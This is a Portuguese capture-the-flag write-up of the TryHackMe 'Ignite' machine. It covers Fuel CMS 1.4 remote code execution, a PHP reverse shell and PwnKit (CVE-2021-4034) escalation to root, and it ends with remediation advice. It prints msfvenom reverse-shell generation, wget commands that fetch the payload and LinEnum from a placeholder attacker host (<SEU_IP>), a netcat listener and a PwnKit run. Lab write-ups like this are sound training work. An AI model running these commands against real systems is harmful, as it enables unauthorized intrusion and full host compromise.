# 1 — Visão geral da metodologia

1. **Objetivo:** evidenciar exploração reprodutível, impacto claro e recomendações acionáveis.
    
2. **Estrutura:** Recon → Enumeração → Exploração → Pós-Explo → Privesc → Flags → Reporting.
    
3. **Princípios:** documentação completa de comandos, resultados e flags.
    

---

# Report — Máquina: `Ignite` — `10.65.143.81`

- **Fonte:** THM
    
- **Data:** `2025-11-28`
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Tempo gasto:** 1h
    
- **Início:** 11:20
    
- **Limitações:** sem restrições impostas pelo lab
    

---

## 1) Executive summary

Vulnerabilidade crítica no **Fuel CMS 1.4** permitiu execução remota de código e shell reversa; após enumeração do sistema, **CVE-2021-4034 (pkexec/PwnKit)** garantiu escalonamento para root e comprometimento completo, com coleta de flags.

---

## 2) Escopo e limitações

- **Alvo:** `10.65.143.81`
    
- **Serviço principal:** HTTP (porta 80)
    
- **Ferramentas utilizadas:** Nmap, Burp Suite, msfvenom, Netcat, LinEnum, PwnKit
    
- **Limitações:** nenhuma informada pelo lab
    

---

## 3) Metodologia aplicada

- Recon: Scan de portas e descobertas de serviços
    
- Enumeração web: CMS Fuel identificado + credenciais padrão
    
- Exploração: RCE via exploit + upload de payload PHP
    
- Acesso inicial: shell reversa como www-data
    
- Pós-exploração: enumeração com LinEnum
    
- Privesc: exploração de PwnKit
    
- Flags coletadas para validação
    

---

## 4) Achado principal

**Vulnerabilidade:** RCE no Fuel CMS 1.4  
**Local:** Interface Web do CMS via Apache (porta 80)  
**PoC resumida:**

`wget http://<SEU_IP>:8000/php-reverse-shell.phtml -O /var/www/html/assets/shell.php`

**Artefatos:** Flags de user e root

---

## 5) Evidências / PoC (resumo)

**Recon**

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.143.81 -oN ~/Desktop/Ignite.txt`

**Exploit + Proxy do Burp ativo**  
RCE através do exploit do Fuel CMS 1.4.1

**Payload**

`msfvenom -p php/reverse_php LHOST=<SEU_IP> LPORT=4444 -f raw > php-reverse-shell.phtml python3 -m http.server 8000`

**Upload via RCE**

`wget http://<SEU_IP>:8000/php-reverse-shell.phtml -O /var/www/html/assets/shell.php`

**Shell reversa no Netcat**

`nc -lvnp 4444`

**Privesc com PwnKit**

`./PwnKit`

---

## 6) Impacto & Severidade

**Severidade:** **Alta**  
**Justificativa:** O atacante obtém RCE sem autenticação sólida, comprometendo a máquina totalmente com privilégio **root**, podendo alterar arquivos de sistema e pivotar.

---

## 7) Reproduzir (passo-a-passo)

1. Scan:
    

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.143.81 -oN Ignite.txt`

2. Identificar Fuel CMS + credenciais padrão
    
3. Burp Suite em modo intercept para acionar o exploit
    
4. Upload do payload:
    

`python3 -m http.server 8000 wget http://<SEU_IP>:8000/php-reverse-shell.phtml -O /var/www/html/assets/shell.php`

5. Capturar shell com Netcat
    
6. Upload LinEnum:
    

`wget http://<SEU_IP>:8000/LinEnum.sh`

7. Executar PwnKit:
    

`./PwnKit whoami → root`

8. Capturar flags em `/home/www-data` (user) e `/root` (root)
    

---

## 8) Recomendações (para gestores)

- Atualizar CMS para versão segura
    
- Restringir acesso ao painel admin e remover credenciais padrão
    
- Monitorar uploads e execuções via WAF
    

---

## 9) Recomendações técnicas

- **Desabilitar execução em uploads**
    
- **Restringir permissões no Apache**
    
- **Aplicar patch do PwnKit (policykit)**
    
- Endurecimento de serviços expostos: firewall, version hiding, logs centralizados
    

---

## 10) Apêndice técnico

### Nmap

Arquivo: `Ignite.txt` 

![](Ignite.txt)

### Payloads utilizados

- msfvenom PHP reverse shell
    
- PwnKit exploit CVE-2021-4034
    
- LinEnum.sh para enumeração
    

### Flags

- `/home/www-data/` → **User Flag**
    
- `/root/` → **Root Flag**
    

---

## 11) Lições aprendidas / Follow-up

- CMS desatualizado = vetor direto de comprometimento
    
- Nunca manter credenciais padrão
    
- Testes regulares de privesc essenciais em hosts Linux